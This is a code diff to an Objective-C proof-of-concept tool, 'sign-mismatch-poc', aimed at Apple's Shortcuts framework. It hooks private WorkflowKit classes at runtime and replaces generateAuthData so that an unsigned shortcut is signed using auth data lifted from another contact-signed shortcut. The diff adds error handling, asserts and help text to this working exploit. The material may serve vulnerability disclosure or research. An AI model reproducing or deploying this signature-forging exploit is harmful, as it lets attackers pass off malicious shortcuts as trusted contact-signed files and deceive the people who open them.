@@ -26,17 +26,23 @@ int verbose = 0;
 char *authPath;
 
 #define EZprintf(format,args...)        \
-                  if (verbose) {      \ 
+                  if (verbose) {      \
                       printf(format, ## args);    \
                   }
 #define EZNSLog(format,args...)        \
-                  if (verbose) {      \ 
+                  if (verbose) {      \
                       NSLog(format, ## args);    \
                   }
 
 id fake_generateAuthData(id self, SEL cmd) {
  EZprintf("reached fake_generateAuthData\n");
- NSData *authData = auth_data_from_path(authPath);
+ load_signed_shortcut_into_memory(authPath);
+ if (is_unsigned()) {
+  fprintf(stderr,"unsigned shortcut passed into archive path\n");
+  exit(1);
+ }
+ NSData *authData = auth_data_from_archive();
+ free_archive();
  EZNSLog(@"authData: %@",authData);
  return authData;
 }
@@ -63,7 +69,7 @@ int debug_hook(id self, SEL cmd, id privateKey, id signingContext, id error) {
 #import "WorkflowKit.h"
 
 @interface Fake_WFWorkflowRecord : NSObject
-@property (readwrite) WFWorkflowFile *fileRepresentation;
+@property (readwrite, assign) WFWorkflowFile *fileRepresentation;
 -(NSString *)name;
 @end
 
@@ -83,9 +89,17 @@ int poc(char *inputPath, char *authPath, char *outputPath) {
   Class WFWorkflowFileClass = objc_getClass("WFWorkflowFile");
   Class WFP2PSignedShortcutFileExporterClass = objc_getClass("WFP2PSignedShortcutFileExporter");
   Class WFFileRepresentationClass = objc_getClass("WFFileRepresentation");
+  assert(WFWorkflowFileDescriptorClass);
+  assert(WFWorkflowFileClass);
+  assert(WFP2PSignedShortcutFileExporterClass);
+  assert(WFFileRepresentationClass);
   
   /* get WFWorkflowRecord from file */
-  WFFileRepresentation *fileRep = [WFFileRepresentationClass fileWithURL:[NSURL fileURLWithPath:[NSString stringWithUTF8String:inputPath]] options:nil];
+  WFFileRepresentation *fileRep = [WFFileRepresentationClass fileWithURL:[NSURL fileURLWithPath:[NSString stringWithUTF8String:inputPath]] options:0];
+  if (!fileRep) {
+   fprintf(stderr,"failed to create WFFileRepresentation for input\n");
+   exit(1);
+  }
   WFWorkflowFileDescriptor *fileDesc = [[WFWorkflowFileDescriptorClass alloc] initWithFile:fileRep name:@"SnoolieShortcut"];
   WFWorkflowFile *wFile = [[WFWorkflowFileClass alloc] initWithDescriptor:fileDesc error:nil];
   //WFWorkflowRecord *workflowRecord = [wFile recordRepresentationWithError:nil]; /* requires cloudkit entitlement */
@@ -93,8 +107,8 @@ int poc(char *inputPath, char *authPath, char *outputPath) {
   [wfRecord setFileRepresentation:wFile];
 
   /* hooks */
-  orig_call = class_replaceMethod(objc_getClass("WFShortcutPackageFile"),sel_getUid("generateSignedShortcutFileRepresentationWithPrivateKey:signingContext:error:"),&debug_hook,0);
-  class_replaceMethod(objc_getClass("WFShortcutSigningContext"),sel_getUid("generateAuthData"),&fake_generateAuthData,0);
+  orig_call = class_replaceMethod(objc_getClass("WFShortcutPackageFile"),sel_getUid("generateSignedShortcutFileRepresentationWithPrivateKey:signingContext:error:"),(IMP)&debug_hook,0);
+  class_replaceMethod(objc_getClass("WFShortcutSigningContext"),sel_getUid("generateAuthData"),(IMP)&fake_generateAuthData,0);
 
  /* now actually sign shortcut */
  WFP2PSignedShortcutFileExporter *exporter = [[WFP2PSignedShortcutFileExporterClass alloc] initWithWorkflowRecord:wfRecord];
@@ -116,10 +130,11 @@ int poc(char *inputPath, char *authPath, char *outputPath) {
 
 void show_help(void) {
  printf("Usage: sign-mismatch-poc <options>\n\n");
- printf(" -i: filepath to the unsigned shortcut to use as input (required)\n");
- printf(" -a: filepath to the contact signed shortcut with the auth data to use to sign (required)\n");
- printf(" -o: filepath to output the data (required, must not exist)\n");
+ printf(" -i: (required) path to the unsigned shortcut to use as input\n");
+ printf(" -a: (required) path to the contact signed shortcut with the auth data to use to sign\n");
+ printf(" -o: (required) path to output the data (must not exist)\n");
  printf(" -v: (optional) verbose/show debug\n");
+ printf(" -h: show usage\n");
 }
 
 int main(int argc, char *argv[]) {
